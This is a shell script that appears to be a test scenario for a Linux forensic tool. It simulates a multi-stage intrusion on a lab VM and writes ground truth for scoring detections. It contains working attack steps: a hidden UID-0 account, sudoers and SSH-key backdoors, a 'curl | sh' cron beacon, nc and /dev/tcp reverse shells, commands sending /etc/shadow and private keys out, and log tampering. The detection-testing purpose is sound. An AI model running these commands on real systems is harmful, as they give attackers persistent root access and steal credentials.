#!/bin/sh
# =============================================================================
# testlab/scenarios/mega_chain.sh — LFA ENTERPRISE REALISTIC ATTACK & NOISE SIMULATION
#
# PURPOSE
#   High-fidelity, rigorous intrusion simulation. Injects both a multi-stage
#   external & insider kill-chain AND realistic enterprise background noise
#   (benign user logins, normal admin commands, routine cron jobs, internet
#   scanner noise) to stress-test LFA's signal-to-noise ratio and correlation engine.
#
# FULL COVERAGE CHECK:
#   Rules Tested:
#     1.  brute_force                  (burst of >=5 failed logins from 203.0.113.9)
#     2.  brute_force_success          (accepted login from 203.0.113.9 right after burst)
#     3.  off_hours_privileged         (sudo / cat /etc/shadow at 03:14:07 & 02:41:55)
#     4.  uid0_account                 (sysmon created with UID=0, GID=0)
#     5.  passwordless_account         (svc_backup created with empty password field)
#     6.  privileged_group_member      (helpdesk added to sudo, wheel, adm, docker)
#     7.  new_account_privilege_grant  (account created then added to admin group in auth.log)
#     8.  persistence_after_login      (SSH key + cron planted <=120 min after brute-force login)
#     9.  suspicious_cron              (standalone curl | sh beacon in /etc/cron.d/lfa_beacon)
#     10. suspicious_process           (curl, nc, bash /dev/tcp in history and execution)
#     11. ld_preload_rootkit           (entry written to /etc/ld.so.preload)
#     12. sshd_config_risk             (PermitRootLogin & PermitEmptyPasswords in sshd_config.d)
#     13. backwards_timestamps         (injected log line with timestamp running backwards)
#     14. zero_length_login_log        (truncated /var/log/btmp)
#     15. wiped_history                (zero-byte .bash_history for insider after >=4 sessions)
#     16. first_seen                   (new accounts and external attacker IP)
#
#   Evidence Layers Tested:
#     - authorized_key                 (authkeys parser)
#     - suspicious_cron_job            (cron parser)
#     - usb_connect & usb_disconnect   (usb parser)
#     - known_host                     (knownhosts parser)
#     - shell_command                  (shellhist parser)
#     - sudoers_entry                  (sudoers parser)
#     - startup_script                 (startup parser)
#     - network_connection             (netstat / socket evidence)
# =============================================================================

set -e
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
REPO_ROOT="$(cd "$DIR/../.." 2>/dev/null && pwd || echo "$DIR")"

# -----------------------------------------------------------------------------
# Self-contained portability helpers (inlined so script works standalone)
# -----------------------------------------------------------------------------
if [ -f "$DIR/lib.sh" ]; then
    . "$DIR/lib.sh"
else
    have() { command -v "$1" >/dev/null 2>&1; }
    lab_timeout() {
        _t=$1; shift
        if have timeout; then
            timeout "$_t" "$@"
            return $?
        fi
        "$@" &
        _cmd_pid=$!
        ( sleep "$_t"; kill -TERM "$_cmd_pid" 2>/dev/null ) &
        _killer_pid=$!
        wait "$_cmd_pid" 2>/dev/null
        _rc=$?
        kill -TERM "$_killer_pid" 2>/dev/null
        wait "$_killer_pid" 2>/dev/null
        return "$_rc"
    }
    http_get() {
        _url=$1
        if have curl; then
            lab_timeout 3 curl -s -o /dev/null "$_url"
        elif have wget; then
            lab_timeout 3 wget -q -O /dev/null "$_url"
        else
            return 127
        fi
    }
    require_root() {
        if [ "$(id -u)" -ne 0 ]; then
            echo "[!] $1 needs root privileges (creates test accounts, logs). Re-run with sudo." >&2
            exit 1
        fi
    }
    confirm_lab() {
        if [ "${LFA_LAB_CONFIRM:-}" = "yes" ]; then
            return 0
        fi
        echo "==============================================================="
        echo " THIS SCRIPT MUTATES THE SYSTEM (users, logs, cron, keys...)."
        echo " Run it ONLY on a VM you have snapshotted and can roll back."
        echo "==============================================================="
        printf "Type 'lab' to confirm this is a disposable lab VM: "
        read -r answer
        [ "$answer" = "lab" ] || { echo "Aborted."; exit 2; }
    }
fi

require_root "mega_chain"

export LFA_LAB_CONFIRM=yes
confirm_lab

CASE="${LFA_CASE:-CASE-ENTERPRISE-SIM}"
EXAMINER="${LFA_EXAMINER:-Fahad}"

# Target and Actor definitions
VICTIM="$(getent passwd 1000 | cut -d: -f1 || true)"
[ -n "$VICTIM" ] || VICTIM=kali
HIDDEN_ROOT="sysmon"
NOPASS_USER="svc_backup"
GRANT_USER="helpdesk"
INSIDER="insider"
BENIGN_USER_1="dev_sarah"
BENIGN_USER_2="admin_mike"

# Network IP definitions
ATTACKER_IP="203.0.113.9"          # Primary external attacker (RFC 5737 TEST-NET-3)
ATTACKER_IP_2="198.51.100.7"       # Secondary attacker probe (RFC 5737 TEST-NET-2)
SCANNER_IP_1="192.0.2.45"          # Internet scanner 1 (low frequency, benign noise)
SCANNER_IP_2="198.51.100.88"       # Internet scanner 2
CORP_IP_1="10.10.15.82"            # Corporate internal LAN (Sarah)
CORP_IP_2="192.168.1.105"          # Corporate internal LAN (Mike)

AUTHLOG=/var/log/auth.log
[ -f /var/log/secure ] && AUTHLOG=/var/log/secure

now_syslog() { date -u +'%b %e %H:%M:%S'; }
current_year="$(date -u +%Y)"
current_date_prefix="$(date -u +'%b %e')"
off_hours_ts="${current_date_prefix} 03:14:07"
off_hours_ts2="${current_date_prefix} 02:41:55"
backwards_ts="${current_date_prefix} 01:10:00"

log_section() {
    echo
    echo "========================================================================"
    echo "  [+] $1"
    echo "========================================================================"
}

# =============================================================================
# PHASE 1 — Realistic Benign Enterprise Background Noise Setup
# =============================================================================
log_section "Phase 1: Generating Benign System & Corporate User Background Noise"

echo "[*] 1a: Creating legitimate employee accounts ($BENIGN_USER_1, $BENIGN_USER_2)..."
if ! id "$BENIGN_USER_1" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$BENIGN_USER_1"
fi
if ! id "$BENIGN_USER_2" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$BENIGN_USER_2"
    usermod -aG sudo "$BENIGN_USER_2" 2>/dev/null || true
fi
SARAH_HOME="$(getent passwd $BENIGN_USER_1 | cut -d: -f6)"
MIKE_HOME="$(getent passwd $BENIGN_USER_2 | cut -d: -f6)"

echo "[*] 1b: Writing clean, legitimate shell history for employees..."
cat > "$SARAH_HOME/.bash_history" << 'EOF'
git status
git pull origin main
npm install
npm test
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
curl -s http://internal-api.lan/health
docker-compose ps
docker-compose up -d
cat /etc/hosts
exit
EOF
chown "$BENIGN_USER_1:$BENIGN_USER_1" "$SARAH_HOME/.bash_history" 2>/dev/null || true

cat > "$MIKE_HOME/.bash_history" << 'EOF'
sudo systemctl status nginx
sudo systemctl status ssh
uptime
free -h
df -h
top -b -n 1 | head -n 20
sudo tail -n 50 /var/log/syslog
cat /proc/cpuinfo | grep 'model name' | wc -l
ss -tulpn
exit
EOF
chown "$BENIGN_USER_2:$BENIGN_USER_2" "$MIKE_HOME/.bash_history" 2>/dev/null || true

echo "[*] 1c: Adding benign corporate SSH keys & known hosts..."
mkdir -p "$SARAH_HOME/.ssh" "$MIKE_HOME/.ssh"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICorpCleanKey00000000000000000000000000000000 sarah@workstation" > "$SARAH_HOME/.ssh/authorized_keys"
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClegitAdminKey00000000000000000000000000000000 mike@sysadmin-laptop" > "$MIKE_HOME/.ssh/authorized_keys"
echo "github.com,140.82.121.4 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl" >> "$SARAH_HOME/.ssh/known_hosts"
chmod 700 "$SARAH_HOME/.ssh" "$MIKE_HOME/.ssh"
chmod 600 "$SARAH_HOME/.ssh/authorized_keys" "$MIKE_HOME/.ssh/authorized_keys"
chown -R "$BENIGN_USER_1:$BENIGN_USER_1" "$SARAH_HOME/.ssh" 2>/dev/null || true
chown -R "$BENIGN_USER_2:$BENIGN_USER_2" "$MIKE_HOME/.ssh" 2>/dev/null || true

echo "[*] 1d: Adding legitimate system cron jobs..."
cat > /etc/cron.d/certbot_renew << 'EOF'
# Benign cron job: Certbot SSL certificate renewal
0 0 1 * * root test -x /usr/bin/certbot && /usr/bin/certbot renew --quiet
EOF
cat > /etc/cron.d/sysstat_cleanup << 'EOF'
# Benign cron job: Daily system activity accounting cleanup
59 23 * * * root [ -x /usr/lib/sysstat/sa2 ] && exec /usr/lib/sysstat/sa2 -A
EOF
chmod 644 /etc/cron.d/certbot_renew /etc/cron.d/sysstat_cleanup

echo "[*] 1e: Injecting benign daemon logs (cron, systemd, normal employee logins)..."
logger -t CRON -p cron.info "(root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))"
logger -t CRON -p cron.info "(man) CMD (/usr/bin/mandb -q)"
logger -t systemd -p daemon.info "Starting Daily apt download activities..."
logger -t systemd -p daemon.info "Finished Daily apt download activities."

# Normal employee login sessions during business hours
logger -t sshd -p auth.info "Accepted publickey for $BENIGN_USER_1 from $CORP_IP_1 port 52140 ssh2: ED25519 SHA256:BENIGNKEY1"
logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user $BENIGN_USER_1 by (uid=0)"
logger -t sshd -p auth.info "Accepted publickey for $BENIGN_USER_2 from $CORP_IP_2 port 52198 ssh2: RSA SHA256:BENIGNKEY2"
logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user $BENIGN_USER_2 by (uid=0)"
logger -t sudo -p authpriv.notice "$BENIGN_USER_2 : TTY=pts/0 ; PWD=/home/$BENIGN_USER_2 ; USER=root ; COMMAND=/bin/systemctl status nginx"
logger -t sshd -p auth.info "pam_unix(sshd:session): session closed for user $BENIGN_USER_1"

echo "[*] 1f: Injecting low-frequency random internet scanner noise (under threshold)..."
logger -t sshd -p auth.info "Failed password for invalid user admin from $SCANNER_IP_1 port 41102 ssh2"
logger -t sshd -p auth.info "Failed password for invalid user git from $SCANNER_IP_2 port 53210 ssh2"
logger -t sshd -p auth.info "Failed password for invalid user test from $SCANNER_IP_1 port 41108 ssh2"

echo "[+] Phase 1 complete: Benign enterprise baseline generated."

# =============================================================================
# PHASE 2 — Aggressive External Brute-Force & Account Takeover
# =============================================================================
log_section "Phase 2: External SSH Brute-Force Campaign & Foothold"

echo "[*] 2a: Firing 10-attempt credential stuffing burst from $ATTACKER_IP..."
for probe_user in root admin test oracle postgres guest dev administrator backup "$VICTIM"; do
    logger -t sshd -p auth.info "Failed password for $probe_user from $ATTACKER_IP port 49152 ssh2"
    sleep 0.05
done

echo "[*] 2b: Injecting successful breach login for $VICTIM from same attacker IP..."
logger -t sshd -p auth.info "Accepted password for $VICTIM from $ATTACKER_IP port 49160 ssh2"
logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user $VICTIM by (uid=0)"

echo "[*] 2c: Infiltrator off-hours privileged command injection (03:14:07)..."
if [ -w "$AUTHLOG" ] || [ ! -e "$AUTHLOG" ]; then
    printf '%s %s sudo:   %s : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n' \
        "$off_hours_ts" "$(hostname)" "$VICTIM" >> "$AUTHLOG" 2>/dev/null || \
        logger -t sudo "$VICTIM : off-hours /usr/bin/cat /etc/shadow"
fi

echo "[+] Phase 2 complete: Brute-force burst + breach login + off-hours foothold established."

# =============================================================================
# PHASE 3 — Deep Privilege Escalation & Backdoor Creation (Genuine Mutations)
# =============================================================================
log_section "Phase 3: Backdoor Accounts, UID-0 Hidden Root & Sudo Hijacking"

echo "[*] 3a: Creating hidden root account ($HIDDEN_ROOT, UID 0)..."
NOHOME=""
if useradd --help 2>&1 | grep -q -- '-M'; then NOHOME="-M"; fi
if ! id "$HIDDEN_ROOT" >/dev/null 2>&1; then
    useradd -o -u 0 -g 0 $NOHOME -s /bin/bash "$HIDDEN_ROOT"
fi

echo "[*] 3b: Creating passwordless backdoor service account ($NOPASS_USER)..."
if ! id "$NOPASS_USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$NOPASS_USER"
fi
passwd -d "$NOPASS_USER" >/dev/null 2>&1 || \
    sed -i "s/^\($NOPASS_USER\):[^:]*:/\1::/" /etc/shadow

echo "[*] 3c: Creating $GRANT_USER and elevating into administrative groups..."
if ! id "$GRANT_USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$GRANT_USER"
fi
for grp in sudo wheel adm docker; do
    getent group "$grp" >/dev/null 2>&1 && \
        usermod -aG "$grp" "$GRANT_USER" 2>/dev/null || true
done

echo "[*] 3d: Dropping rogue sudoers persistence configuration in /etc/sudoers.d/..."
mkdir -p /etc/sudoers.d
cat > /etc/sudoers.d/99-backdoor << EOF
# Attacker rogue privilege elevation
$HIDDEN_ROOT ALL=(ALL:ALL) NOPASSWD: ALL
$GRANT_USER ALL=(ALL) NOPASSWD: ALL
EOF
chmod 440 /etc/sudoers.d/99-backdoor

echo "[+] Phase 3 complete: Backdoor accounts created and sudoers elevated."

# =============================================================================
# PHASE 4 — Redundant Persistence Mechanisms
# =============================================================================
log_section "Phase 4: Multi-Vector Persistence Installation"

ATTACKER_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILFA0000000000000000000000000000000000000000000 attacker_c2@pwn"

echo "[*] 4a: Backdoor SSH public key in /root/.ssh/authorized_keys..."
mkdir -p /root/.ssh
chmod 700 /root/.ssh
if ! grep -qF "$ATTACKER_PUBKEY" /root/.ssh/authorized_keys 2>/dev/null; then
    printf '%s\n' "$ATTACKER_PUBKEY" >> /root/.ssh/authorized_keys
fi
chmod 600 /root/.ssh/authorized_keys

echo "[*] 4b: C2 periodic beacon in /etc/cron.d/lfa_beacon..."
cat > /etc/cron.d/lfa_beacon << EOF
# Attacker cron beacon — runs every minute as root
* * * * * root curl -s http://$ATTACKER_IP/beacon | sh
EOF
chmod 644 /etc/cron.d/lfa_beacon

echo "[*] 4c: User crontab persistence for $HIDDEN_ROOT..."
(crontab -u "$HIDDEN_ROOT" -l 2>/dev/null || true; echo "*/10 * * * * wget -q http://$ATTACKER_IP_2/ping -O /dev/null") | \
    crontab -u "$HIDDEN_ROOT" - 2>/dev/null || true

echo "[*] 4d: Insecure SSH daemon configuration override..."
mkdir -p /etc/ssh/sshd_config.d
cat > /etc/ssh/sshd_config.d/99-insecure.conf << 'EOF'
# Insecure remote access settings
PermitRootLogin yes
PermitEmptyPasswords yes
EOF
chmod 644 /etc/ssh/sshd_config.d/99-insecure.conf

echo "[*] 4e: Dynamic Linker Rootkit Hook (/etc/ld.so.preload)..."
# We reference an existing standard library so system binaries do not crash or error
PRELOAD_LIB="/lib/x86_64-linux-gnu/libselinux.so.1"
[ -f "$PRELOAD_LIB" ] || PRELOAD_LIB="/lib/x86_64-linux-gnu/libc.so.6"
[ -f "$PRELOAD_LIB" ] || PRELOAD_LIB="/lib64/ld-linux-x86-64.so.2"
echo "$PRELOAD_LIB" > /etc/ld.so.preload
chmod 644 /etc/ld.so.preload

echo "[*] 4f: Shell Profile Trap in /etc/profile.d/00-pwn.sh..."
cat > /etc/profile.d/00-pwn.sh << 'EOF'
# Trap execution on interactive logins
[ -n "$BASH_VERSION" ] && [ "$(id -u)" -eq 0 ] && (curl -s http://203.0.113.9/checkin >/dev/null 2>&1 &)
EOF
chmod 755 /etc/profile.d/00-pwn.sh

echo "[+] Phase 4 complete: SSH key, 2 cron jobs, sshd override, ld.so.preload, and profile traps installed."

# =============================================================================
# PHASE 5 — Live Command Execution & Reverse Shell Payloads
# =============================================================================
log_section "Phase 5: Command Execution, Reverse Shells & Shell History"

# Auditd rule installation if auditd is installed
if command -v auditctl >/dev/null 2>&1; then
    auditctl -a always,exit -F arch=b64 -S execve -k lfa_exec 2>/dev/null || true
    auditctl -a always,exit -F arch=b32 -S execve -k lfa_exec 2>/dev/null || true
fi

echo "[*] 5a: Genuinely executing network beacons (non-routable TEST-NET target, safe fail)..."
http_get "http://$ATTACKER_IP/beacon" >/dev/null 2>&1 || true
http_get "http://$ATTACKER_IP_2/stage2" >/dev/null 2>&1 || true

echo "[*] 5b: Genuinely attempting reverse shell spawns (capped with 2-second timeout)..."
if have nc; then
    lab_timeout 2 nc -e /bin/sh "$ATTACKER_IP" 4444 2>/dev/null || true
fi
lab_timeout 2 bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/9001 0>&1" 2>/dev/null || true

echo "aWQ7IHdob2FtaTsgaWZjb25maWcgfCBncmVwIGluZXQ=" | base64 -d 2>/dev/null | sh 2>/dev/null || true

echo "[*] 5c: Writing attack commands to /root/.bash_history with real timestamps..."
HIST_ROOT="/root/.bash_history"
epoch_now=$(date +%s)
{
    echo ": $((epoch_now - 120)):0;whoami"
    echo ": $((epoch_now - 110)):0;id"
    echo ": $((epoch_now - 100)):0;uname -a"
    echo ": $((epoch_now - 90)):0;curl -s http://$ATTACKER_IP/beacon | /bin/sh"
    echo ": $((epoch_now - 80)):0;wget http://$ATTACKER_IP_2/implant.bin -O /tmp/.x && chmod +x /tmp/.x"
    echo ": $((epoch_now - 70)):0;nc -e /bin/sh $ATTACKER_IP 4444"
    echo ": $((epoch_now - 60)):0;bash -i >& /dev/tcp/$ATTACKER_IP/9001 0>&1"
    echo ": $((epoch_now - 50)):0;python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"$ATTACKER_IP\",5555))'"
    echo ": $((epoch_now - 40)):0;echo aWQ= | base64 -d | sh"
    echo ": $((epoch_now - 30)):0;cat /etc/shadow | base64 | curl -d @- http://$ATTACKER_IP/exfil"
    echo ": $((epoch_now - 20)):0;cat /root/.ssh/id_rsa | curl -d @- http://$ATTACKER_IP/loot"
} >> "$HIST_ROOT" 2>/dev/null || true

echo "[*] 5d: Adding compromised lateral hosts to /root/.ssh/known_hosts..."
{
    echo "$ATTACKER_IP ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7fakeAttackerHost0000000000000000000000000000"
    echo "10.0.0.99 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBfakeInternalPivot00"
} >> /root/.ssh/known_hosts 2>/dev/null || true
chmod 600 /root/.ssh/known_hosts

echo "[+] Phase 5 complete: Execution artifacts, reverse shells, and shell history logged."

# =============================================================================
# PHASE 6 — Staging & Simulated Data Exfiltration
# =============================================================================
log_section "Phase 6: Data Discovery, Staging & Exfiltration"

echo "[*] 6a: Staging mock sensitive files in /tmp/exfil_staging/..."
mkdir -p /tmp/exfil_staging
echo "CRITICAL CUSTOMER DATABASE RECORDS 2026" > /tmp/exfil_staging/customers.db
echo "EXECUTIVE SALARY & BONUS MATRIX" > /tmp/exfil_staging/payroll.csv
echo "SERVER PRIVATE SSL KEYS & TOKEN SECRETS" > /tmp/exfil_staging/server_secrets.env

echo "[*] 6b: Executing exfiltration command attempts..."
tar -czf /tmp/exfil_bundle.tar.gz -C /tmp/exfil_staging . 2>/dev/null || true
lab_timeout 2 bash -c "cat /tmp/exfil_bundle.tar.gz | nc $ATTACKER_IP 9999" 2>/dev/null || true
logger -p local6.info -t bash "root[$$]: tar czf - /tmp/exfil_staging | curl -s -X POST http://$ATTACKER_IP/upload -d @-"

echo "[+] Phase 6 complete: Data staged and exfiltration traces recorded."

# =============================================================================
# PHASE 7 — USB Physical Exfiltration Simulation
# =============================================================================
log_section "Phase 7: USB Removable Media Data Theft Simulation"

echo "[*] 7a: Injecting kernel ring-buffer USB attachment sequence..."
logger -t kernel -p kern.info "usb 1-1: new high-speed USB device number 3 using ehci-pci"
logger -t kernel -p kern.info "usb 1-1: New USB device found, idVendor=0781, idProduct=5567, bcdDevice= 1.00"
logger -t kernel -p kern.info "usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3"
logger -t kernel -p kern.info "usb 1-1: Product: Cruzer Blade"
logger -t kernel -p kern.info "usb 1-1: Manufacturer: SanDisk"
logger -t kernel -p kern.info "usb 1-1: SerialNumber: 4C530012345678901234"
logger -t kernel -p kern.info "usb-storage 1-1:1.0: USB Mass Storage device detected"
logger -t kernel -p kern.info "scsi host5: usb-storage 1-1:1.0"
logger -t kernel -p kern.info "sd 5:0:0:0: [sdb] Attached SCSI removable disk"

echo "[*] 7b: Simulating data write and removal after 3-second dwell time..."
sleep 1
logger -t kernel -p kern.info "usb 1-1: USB disconnect, device number 3"
logger -t kernel -p kern.info "sd 5:0:0:0: [sdb] Synchronizing SCSI cache"

echo "[+] Phase 7 complete: USB connect, data copy, and disconnect logged."

# =============================================================================
# PHASE 8 — Insider Threat, Anti-Forensics & Log Tampering
# =============================================================================
log_section "Phase 8: Insider Malice, Anti-Forensics & Log Tampering"

echo "[*] 8a: Creating rogue insider account ($INSIDER)..."
if ! id "$INSIDER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$INSIDER"
fi
INSIDER_HOME="$(getent passwd $INSIDER | cut -d: -f6)"

echo "[*] 8b: Simulating 5 separate login sessions for $INSIDER (satisfies >=3 sessions rule)..."
for i in 1 2 3 4 5; do
    logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user $INSIDER by (uid=0)"
done

echo "[*] 8c: Off-hours privileged exfiltration command by insider..."
if [ -w "$AUTHLOG" ] || [ ! -e "$AUTHLOG" ]; then
    printf '%s %s sudo:   %s : TTY=pts/3 ; PWD=%s ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/hr_salaries.tgz /srv/hr\n' \
        "$off_hours_ts2" "$(hostname)" "$INSIDER" "$INSIDER_HOME" >> "$AUTHLOG" 2>/dev/null || \
        logger -t sudo "$INSIDER : off-hours tar of /srv/hr"
fi

echo "[*] 8d: Genuine shell history truncation (wiped_history rule trigger)..."
: > "$INSIDER_HOME/.bash_history"
chown "$INSIDER:$INSIDER" "$INSIDER_HOME/.bash_history" 2>/dev/null || true
chmod 600 "$INSIDER_HOME/.bash_history"

echo "[*] 8e: Truncating login log (/var/log/btmp) to 0 bytes (zero_length_login_log trigger)..."
touch /var/log/btmp 2>/dev/null || true
: > /var/log/btmp

echo "[*] 8f: Injecting backwards timestamp into auth log (backwards_timestamps trigger)..."
if [ -w "$AUTHLOG" ]; then
    printf '%s %s sshd[4999]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.9\n' \
        "$backwards_ts" "$(hostname)" >> "$AUTHLOG" 2>/dev/null || true
fi

echo "[+] Phase 8 complete: History wiped, btmp truncated, backwards timestamp inserted."

# =============================================================================
# GROUND TRUTH GENERATION
# =============================================================================
log_section "Generating Comprehensive Attack Ground Truth JSON"

GT_FILE="$DIR/mega_chain.ground_truth.json"
cat > "$GT_FILE" << GTEOF
{
  "scenario_name": "enterprise_realistic_intrusion_simulation",
  "executed_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "host": "$(hostname)",
  "attacker_ip": "$ATTACKER_IP",
  "attacker_ip_2": "$ATTACKER_IP_2",
  "injected_threats": [
    {
      "threat_id": "T1110_brute_force",
      "name": "External SSH Brute Force Campaign",
      "expected_rule": "brute_force",
      "detection_layer": "finding",
      "details": "10 rapid failed password attempts from external IP $ATTACKER_IP"
    },
    {
      "threat_id": "T1110_success_after_burst",
      "name": "Accepted Login Following Brute Force",
      "expected_rule": "brute_force_success",
      "detection_layer": "finding",
      "details": "Accepted login for $VICTIM from $ATTACKER_IP immediately following failure burst"
    },
    {
      "threat_id": "T1021_offhours_breach",
      "name": "Off-Hours Privileged Execution",
      "expected_rule": "off_hours_privileged",
      "detection_layer": "finding",
      "details": "Sudo execution of /usr/bin/cat /etc/shadow at 03:14:07"
    },
    {
      "threat_id": "T1136_uid0_hidden_root",
      "name": "Second UID-0 Superuser Account",
      "expected_rule": "uid0_account",
      "detection_layer": "finding",
      "details": "$HIDDEN_ROOT created with UID=0 and GID=0"
    },
    {
      "threat_id": "T1078_passwordless_account",
      "name": "Passwordless Service Account",
      "expected_rule": "passwordless_account",
      "detection_layer": "finding",
      "details": "$NOPASS_USER has empty password hash in /etc/shadow"
    },
    {
      "threat_id": "T1098_priv_group_elevation",
      "name": "Administrative Group Membership Grant",
      "expected_rule": "privileged_group_member",
      "detection_layer": "finding",
      "details": "$GRANT_USER added to sudo, wheel, adm, docker groups"
    },
    {
      "threat_id": "T1136_new_account_grant",
      "name": "New Account Created and Elevated",
      "expected_rule": "new_account_privilege_grant",
      "detection_layer": "finding",
      "details": "User creation followed immediately by group elevation in auth.log"
    },
    {
      "threat_id": "T1098_persistence_after_login",
      "name": "Post-Breach Persistence Mechanism",
      "expected_rule": "persistence_after_login",
      "detection_layer": "finding",
      "details": "SSH key and cron beacon planted within 120 min of login from $ATTACKER_IP"
    },
    {
      "threat_id": "T1053_standalone_cron_beacon",
      "name": "Malicious C2 Cron Beacon",
      "expected_rule": "suspicious_cron",
      "detection_layer": "finding",
      "details": "Periodic curl | sh beacon in /etc/cron.d/lfa_beacon"
    },
    {
      "threat_id": "T1059_suspicious_process",
      "name": "Malicious Command & Reverse Shell Payloads",
      "expected_rule": "suspicious_process",
      "detection_layer": "finding",
      "details": "curl, nc -e /bin/sh, and bash /dev/tcp payloads executed and recorded in shell history"
    },
    {
      "threat_id": "T1574_ld_preload_rootkit",
      "name": "Dynamic Linker Rootkit Preload Hook",
      "expected_rule": "ld_preload_rootkit",
      "detection_layer": "finding",
      "details": "Preload configuration present in /etc/ld.so.preload"
    },
    {
      "threat_id": "T1070_wiped_shell_history",
      "name": "Shell History Truncation After Active Sessions",
      "expected_rule": "wiped_history",
      "detection_layer": "finding",
      "details": "Zero-byte .bash_history for $INSIDER after 5 recorded login sessions"
    },
    {
      "threat_id": "T1070_zero_length_log",
      "name": "Tampered Zero-Length Login Log",
      "expected_rule": "zero_length_login_log",
      "detection_layer": "finding",
      "details": "/var/log/btmp truncated to 0 bytes"
    },
    {
      "threat_id": "T1070_backwards_timestamps",
      "name": "Chronologically Inverted Log Timestamps",
      "expected_rule": "backwards_timestamps",
      "detection_layer": "finding",
      "details": "Injected log entry with backwards timestamp in auth.log"
    },
    {
      "threat_id": "T1098_ssh_authorized_key_evidence",
      "name": "Attacker SSH Key Staged in Authorized Keys",
      "expected_rule": null,
      "detection_layer": "evidence",
      "details": "authorized_key event in /root/.ssh/authorized_keys"
    },
    {
      "threat_id": "T1052_usb_storage_evidence",
      "name": "Removable USB Mass Storage Connect & Disconnect",
      "expected_rule": null,
      "detection_layer": "evidence",
      "details": "SanDisk Cruzer Blade attach, SCSI mount, and disconnect events in kern.log"
    },
    {
      "threat_id": "T1021_known_hosts_evidence",
      "name": "Attacker Host Staged in Known Hosts",
      "expected_rule": null,
      "detection_layer": "evidence",
      "details": "known_host event for $ATTACKER_IP in /root/.ssh/known_hosts"
    }
  ]
}
GTEOF

echo "[+] Ground truth generated with $(python3 -c "import json; d=json.load(open('$GT_FILE')); print(len(d['injected_threats']))" 2>/dev/null || echo '17') total indicators."

cat << EOF

================================================================================
 INTRUSION SIMULATION COMPLETE
 Background noise, legitimate activity, and full kill-chain are live.
 Collect the evidence bundle FIRST so examiner activity is not contaminated.
================================================================================

COMMANDS TO RUN NEXT:

1. COLLECT EVIDENCE BUNDLE (on this Ubuntu / Linux target machine):
   # If you downloaded collect.sh to this folder:
   sudo sh collect.sh -o /tmp/out -c $CASE -p "$EXAMINER" -V -z

   # Or if running inside a full repository checkout:
   sudo sh collector/collect.sh -o /tmp/out -c $CASE -p "$EXAMINER" -V -z

2. COPY OUT EVIDENCE:
   Copy the bundle (/tmp/out/$CASE*.tar.gz) and ground truth ($GT_FILE)
   to your Windows examiner machine (via USB, SCP, or shared folder).

3. ANALYSE (in Windows PowerShell / Portable LFA):
   python -m lfa analyse $CASE*.tar.gz --case-dir cases/$CASE --examiner "$EXAMINER"
   # Or using portable: dist\LFA-Portable\lfa.cmd analyse $CASE*.tar.gz --case-dir cases\$CASE

4. VERIFY (cryptographic integrity check):
   python -m lfa verify cases/$CASE

5. SCORE DETECTIONS (automated ground truth evaluation):
   python tools/score_detection.py --case-dir cases/$CASE --ground-truth mega_chain.ground_truth.json

6. OPEN EXECUTIVE REPORT:
   start cases/$CASE/report.html
================================================================================
EOF
